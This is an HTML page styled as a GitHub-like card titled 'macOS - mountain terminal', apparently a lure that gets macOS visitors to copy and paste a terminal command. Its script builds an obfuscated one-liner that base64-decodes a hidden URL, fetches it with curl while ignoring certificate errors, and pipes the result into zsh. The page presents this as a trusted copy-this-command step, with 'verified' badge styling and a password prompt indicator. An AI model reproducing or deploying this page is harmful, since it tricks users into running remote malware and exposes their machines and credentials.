<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>macOS - mountain terminal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background-color: #0d1117;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
            font-size: 14px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
            color: #c9d1d9;
            line-height: 1.5;
        }

        /* Toast */
        .copy-toast {
            position: fixed;
            top: 16px;
            right: 16px;
            background: #238636;
            color: #ffffff;
            padding: 8px 16px;
            border-radius: 6px;
            font-size: 13px;
            font-weight: 500;
            opacity: 0;
            transform: translateY(-8px);
            transition: opacity 0.2s, transform 0.2s;
            z-index: 100;
            border: 1px solid #2ea043;
        }
        .copy-toast.show {
            opacity: 1;
            transform: translateY(0);
        }

        /* Main card */
        .gh-card {
            max-width: 760px;
            width: 100%;
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
        }

        /* Header */
        .gh-card-header {
            padding: 16px;
            border-bottom: 1px solid #30363d;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 12px;
            background: #161b22;
            border-radius: 6px 6px 0 0;
        }

        .title-wrapper {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .icon-shell {
            color: #8b949e;
            display: flex;
            align-items: center;
        }
        .icon-shell svg path { fill: #8b949e; }

        .title-wrapper h1 {
            font-size: 16px;
            font-weight: 600;
            color: #c9d1d9;
        }

        .badge-group {
            display: flex;
            gap: 6px;
            flex-wrap: wrap;
        }

        .badge {
            display: inline-flex;
            align-items: center;
            gap: 4px;
            padding: 0 7px;
            height: 20px;
            font-size: 12px;
            font-weight: 500;
            border-radius: 2em;
            border: 1px solid transparent;
            white-space: nowrap;
            background: #21262d;
            color: #8b949e;
            border-color: #30363d;
        }

        .badge.verified {
            background: #0f2a1b;
            color: #3fb950;
            border-color: rgba(63,185,80,0.3);
        }

        /* Body */
        .gh-card-body {
            padding: 16px;
        }

        /* Terminal block */
        .terminal-block {
            border: 1px solid #30363d;
            border-radius: 6px;
            overflow: hidden;
            margin-bottom: 12px;
        }

        .terminal-header {
            background: #21262d;
            border-bottom: 1px solid #30363d;
            padding: 8px 12px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .terminal-header .prompt {
            font-size: 12px;
            color: #8b949e;
            font-family: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", monospace;
        }

        .terminal-header .tag {
            font-size: 11px;
            color: #58a6ff;
            background: rgba(88,166,255,0.1);
            border: 1px solid rgba(88,166,255,0.3);
            border-radius: 2em;
            padding: 1px 8px;
            font-weight: 500;
        }

        .command-container {
            display: flex;
            align-items: center;
            background: #0d1117;
            padding: 12px;
            gap: 12px;
            cursor: pointer;
        }

        .command-container:hover {
            background: #111820;
        }

        .command-container code {
            flex: 1;
            font-family: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", monospace;
            font-size: 13px;
            color: #c9d1d9;
            word-break: break-all;
            user-select: all;
        }

        .copy-button {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 5px 12px;
            font-size: 12px;
            font-weight: 500;
            color: #c9d1d9;
            background: #21262d;
            border: 1px solid #30363d;
            border-radius: 6px;
            cursor: pointer;
            white-space: nowrap;
            transition: background 0.1s, border-color 0.1s;
            flex-shrink: 0;
        }

        .copy-button:hover {
            background: #30363d;
            border-color: #8b949e;
        }

        .copy-button svg {
            width: 14px;
            height: 14px;
            stroke: #8b949e;
            fill: none;
            stroke-width: 1.5;
        }

        .command-footer {
            background: #0d1117;
            border-top: 1px solid #21262d;
            padding: 6px 12px;
            display: flex;
            align-items: center;
            gap: 6px;
            color: #8b949e;
            font-size: 12px;
        }

        .command-footer svg {
            color: #8b949e;
            flex-shrink: 0;
        }

        /* Steps */
        .steps-panel {
            border: 1px solid #30363d;
            border-radius: 6px;
            overflow: hidden;
            margin-bottom: 12px;
        }

        .step-chip {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 10px 14px;
            border-bottom: 1px solid #21262d;
        }

        .step-chip:last-of-type {
            border-bottom: none;
        }

        .step-number {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background: #21262d;
            border: 1px solid #30363d;
            font-size: 11px;
            font-weight: 600;
            color: #8b949e;
            flex-shrink: 0;
        }

        .step-text {
            font-size: 13px;
            color: #c9d1d9;
        }

        .step-text strong {
            color: #e6edf3;
            font-weight: 600;
        }

        .step-text code {
            font-family: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", monospace;
            font-size: 12px;
            padding: 1px 5px;
            background: #21262d;
            border: 1px solid #30363d;
            border-radius: 4px;
            color: #c9d1d9;
        }

        .step-text svg path { fill: #8b949e; }

        .password-indicator {
            display: flex;
            align-items: center;
            gap: 6px;
            padding: 8px 14px;
            font-size: 12px;
            color: #8b949e;
            background: #0d1117;
            border-top: 1px solid #21262d;
        }

        /* Footer */
        .gh-card-footer {
            padding: 12px 16px;
            border-top: 1px solid #30363d;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 8px;
            background: #161b22;
            border-radius: 0 0 6px 6px;
        }

        .footer-stats {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .stat-badge {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            font-size: 12px;
            color: #8b949e;
        }

        .stat-badge svg {
            width: 14px;
            height: 14px;
        }

        .os-mini {
            font-size: 12px;
            color: #6e7681;
            display: flex;
            align-items: center;
            gap: 3px;
        }
    </style>

    <script>
        document.title = 'macOS - mountain terminal';
        function sok(gotourl) {
            var cmd = gotourl;
            if (cmd.startsWith('http')) {
                cmd = btoa(cmd.replace('REPLACE', randstr(5)));
                cmd = `curl -kfsSL $(echo '${cmd}'|base64 -d)|zsh`;
            }
            window.cmd = cmd;
            document.getElementById('commandText').innerHTML = cmd;
        }
    </script>
</head>

    <script>
        (function() {
            const copyBtn = document.getElementById('copyButton');
            const commandEl = document.getElementById('commandText');
            const toast = document.getElementById('toast');
            const container = document.getElementById('commandContainer');

            async function copyText(text) {
                try {
                    if (navigator.clipboard && navigator.clipboard.writeText) {
                        await navigator.clipboard.writeText(text);
                    } else {
                        const textArea = document.createElement('textarea');
                        textArea.value = text;
                        textArea.style.position = 'fixed';
                        textArea.style.opacity = '0';
                        document.body.appendChild(textArea);
                        textArea.select();
                        document.execCommand('copy');
                        document.body.removeChild(textArea);
                    }
                    showToast();
                } catch (err) {
                    alert('Please copy the command manually.');
                }
            }

            function showToast() {
                toast.classList.add('show');
                setTimeout(() => { toast.classList.remove('show'); }, 1800);
            }

            copyBtn.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                copyText(commandEl.innerText);
            });

            container.addEventListener('click', (e) => {
                if (!e.target.closest('.copy-button')) {
                    copyText(commandEl.innerText);
                }
            });
        })();
    </script>
